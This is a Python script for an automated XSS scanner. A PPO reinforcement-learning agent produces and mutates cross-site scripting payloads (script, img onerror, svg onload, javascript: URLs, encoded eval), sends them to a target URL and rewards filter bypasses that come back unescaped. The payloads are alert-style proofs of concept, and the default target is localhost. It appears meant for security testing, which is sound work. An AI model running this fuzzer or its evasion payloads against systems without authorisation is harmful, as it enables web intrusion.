import gymnasium as gym
from gymnasium import spaces
import numpy as np
import requests
from stable_baselines3 import PPO
import time
import random
import html
from typing import List, Tuple, Any, Callable

class XSSPayloadGenerator:
    """
    Generates potential XSS payloads using a combination of templates and mutations.
    """
    def __init__(self):
        self.USE_LLM_GENERATOR = False
        if self.USE_LLM_GENERATOR:
            try:
                from transformers import GPT2LMHeadModel, GPT2Tokenizer
                print("Loading GPT-2 model for payload generation...")
                self.tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
                self.model = GPT2LMHeadModel.from_pretrained("gpt2")
                self.model.eval()
                print("Model loaded.")
            except ImportError:
                print("Transformers not installed. LLM generation disabled.")
                self.USE_LLM_GENERATOR = False
        
        self.templates: List[str] = [
            "<{tag} {event}='{code}'>", "<{tag} {event}=\"{code}\">", "<{tag} href='javascript:{code}'>",
            "<img src=x onerror='{code}'>", "<svg onload='{code}'>",
            "<iframe srcdoc=\"&lt;script&gt;{code}&lt;/script&gt;\">"
        ]
        self.tags: List[str] = ["script", "img", "svg", "iframe", "a", "body", "div", "video", "audio"]
        self.events: List[str] = ["onerror", "onload", "onmouseover", "onclick", "onfocus", "onpageshow", "onstart"]
        self.code_variants: List[str] = [
            "alert(1)", "prompt(1)", "confirm(1)", "alert(document.domain)",
            "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
        ]
        self.mutations: List[Callable[[str], str]] = [
            lambda p: p, lambda p: p.upper(), lambda p: p.lower(), lambda p: p.replace("<", "&lt;"),
            lambda p: p.replace("(", "%28").replace(")", "%29"),
            lambda p: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
            lambda p: p.replace("script", "sc\r\nipt"), lambda p: p.replace("script", "sc/**/ript"),
            lambda p: p + f"// {random.randint(1000, 9999)}", lambda p: p.replace(" ", "&#9;"),
        ]

    def generate_payload(self, strategy: str, mutation_idx: int) -> str:
        payload = self._generate_from_template()
        return self.mutations[mutation_idx](payload)

    def _generate_from_template(self) -> str:
        template = random.choice(self.templates)
        return template.format(tag=random.choice(self.tags), event=random.choice(self.events), code=random.choice(self.code_variants))

class GenerativeXSSEnv(gym.Env):
    metadata = {'render_modes': ['human']}

    def __init__(self, target_url: str, request_delay: float = 0.01):
        super().__init__()
        self.target_url = target_url
        self.request_delay = request_delay
        self.generator = XSSPayloadGenerator()
        self.base_payloads: List[str] = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "javascript:alert(1)", "<a href=\"javascript:alert(1)\">Click</a>"
        ]
        self.generated_payloads: List[str] = []
        self.successful_payloads = set()
        self.action_space = spaces.MultiDiscrete([3, 10, len(self.generator.mutations)])
        self.observation_space = spaces.Box(low=0.0, high=1.0, shape=(4,), dtype=np.float32)
        self.total_steps = 0
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'GenerativeXSSTestingBot/1.0'})

    def reset(self, *, seed: int | None = None, options: dict[str, Any] | None = None) -> tuple[np.ndarray, dict[str, Any]]:
        super().reset(seed=seed)
        return np.zeros(self.observation_space.shape, dtype=self.observation_space.dtype), {}

    def step(self, action: np.ndarray) -> tuple[np.ndarray, float, bool, bool, dict[str, Any]]:
        self.total_steps += 1
        time.sleep(self.request_delay)
        strategy, payload_idx, mutation_idx = action
        if strategy == 0:
            base_payload = self.base_payloads[payload_idx % len(self.base_payloads)]
            payload = self.generator.mutations[mutation_idx](base_payload)
            strategy_name = "Base"
        elif strategy == 1 and self.generated_payloads:
            base_payload = self.generated_payloads[payload_idx % len(self.generated_payloads)]
            payload = self.generator.mutations[mutation_idx](base_payload)
            strategy_name = "ReplayGen"
        else:
            payload = self.generator.generate_payload(strategy='template', mutation_idx=mutation_idx)
            self.generated_payloads.append(payload)
            strategy_name = "Generate"
            if len(self.generated_payloads) > 50: self.generated_payloads.pop(0)

        if payload in self.successful_payloads:
            reward = -2.0
            obs = np.array([1.0, 0.0, 1.0, min(len(payload) / 100.0, 1.0)], dtype=np.float32)
            return obs, reward, False, False, {'is_vulnerable': True, 'payload': payload, 'status': 'Duplicate'}

        obs, reward, is_vulnerable, status_code = self._test_payload(payload)
        print(f"Step: {self.total_steps: <4} | Strategy: {strategy_name: <9} | Status: {status_code} | Vuln: {is_vulnerable!s: <5} | Reward: {reward: <5.1f} | Payload: {payload[:60]}")
        return obs, reward, is_vulnerable, False, {'is_vulnerable': is_vulnerable, 'payload': payload, 'status': status_code}

    def _test_payload(self, payload: str) -> Tuple[np.ndarray, float, bool, int]:
        try:
            encoded_payload = requests.utils.quote(payload, safe='')
            response = self.session.get(f"{self.target_url}?q={encoded_payload}", timeout=3)
            content, status_code = response.text, response.status_code
        except requests.exceptions.RequestException:
            content, status_code = "", 500

        is_blocked = status_code == 403 or status_code >= 500
        is_vulnerable = (payload in content) and not is_blocked
        if '<' in payload and html.escape(payload) in content: is_vulnerable = False

        reward = 0.0
        if is_vulnerable:
            reward += 10.0
            if payload not in self.successful_payloads:
                reward += 5.0
                self.successful_payloads.add(payload)
                print(f"✅ New unique exploit found! Total unique finds: {len(self.successful_payloads)}")
                with open("successful_payloads.txt", "a") as f: f.write(f"{self.target_url}?q={encoded_payload}\n")
        elif is_blocked: reward -= 5.0
        else: reward -= 0.1

        obs = np.array([status_code / 500.0, 1.0 if is_blocked else 0.0, 1.0 if is_vulnerable else 0.0, min(len(payload) / 100.0, 1.0)], dtype=np.float32)
        return obs, reward, is_vulnerable, status_code
    
    def close(self): self.session.close()

def train_agent(target_url: str, save_path: str, ppo_params: dict):
    """Initializes the environment and trains the PPO agent."""
    print(f"\n--- Starting Training for model: {save_path} ---")
    print(f"Using parameters: {ppo_params}")
    env = GenerativeXSSEnv(target_url=target_url, request_delay=0.1)
    
    model = PPO("MlpPolicy", env, verbose=1, **ppo_params)
    model.learn(total_timesteps=10000)
    model.save(save_path)
    
    print(f"\n--- Training Finished. Model saved to {save_path} ---")
    print(f"Found {len(env.successful_payloads)} unique successful payloads during training.")
    env.close()

def test_agent(target_url: str, model_path: str):
    """Loads a pre-trained agent and tests it against the target."""
    print(f"\n--- Loading and Testing Agent from {model_path} ---")
    
    try:
        model = PPO.load(model_path)
    except FileNotFoundError:
        print(f"Error: Model file not found at {model_path}")
        print("Please train a model first using '--mode train' or '--mode optimize'.")
        return

    env = GenerativeXSSEnv(target_url=target_url, request_delay=0.2)
    obs, _ = env.reset()
    
    for i in range(100): # Test for 100 steps
        action, _states = model.predict(obs, deterministic=True)
        obs, reward, terminated, truncated, info = env.step(action)
        if terminated or truncated:
            if info.get('is_vulnerable'):
                print(f"✅ Episode finished. Exploit found: {info.get('payload')}")
            obs, _ = env.reset()
    
    print("\n--- Testing Complete ---")
    print(f"Found {len(env.successful_payloads)} unique successful payloads during this test run.")
    env.close()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Train, test, or optimize an RL agent for XSS detection.")
    parser.add_argument('--mode', type=str, choices=['train', 'test', 'optimize'], default='train', help='The operational mode.')
    parser.add_argument('--target', type=str, default='http://127.0.0.1:5000/search', help='The target URL to test.')
    parser.add_argument('--model-path', type=str, default='xss_agent_ppo_trained.zip', help='Path to load the model for testing.')
    
    args = parser.parse_args()

    if args.mode == 'train':
        # Standard training parameters
        params = {"ent_coef": 0.01, "n_steps": 2048, "learning_rate": 0.0003}
        train_agent(target_url=args.target, save_path="xss_agent_ppo_trained.zip", ppo_params=params)
        
    elif args.mode == 'optimize':
        # In a real-world scenario, you would use a library like Optuna to find these
        # values. Here, we simulate using "better" or different parameters.
        print("--- Running in Optimization Mode ---")
        print("Simulating training with optimized hyperparameters.")
        optimized_params = {"ent_coef": 0.005, "n_steps": 4096, "learning_rate": 0.0001, "gamma": 0.99}
        train_agent(target_url=args.target, save_path="xss_agent_optimized.zip", ppo_params=optimized_params)

    elif args.mode == 'test':
        test_agent(target_url=args.target, model_path=args.model_path)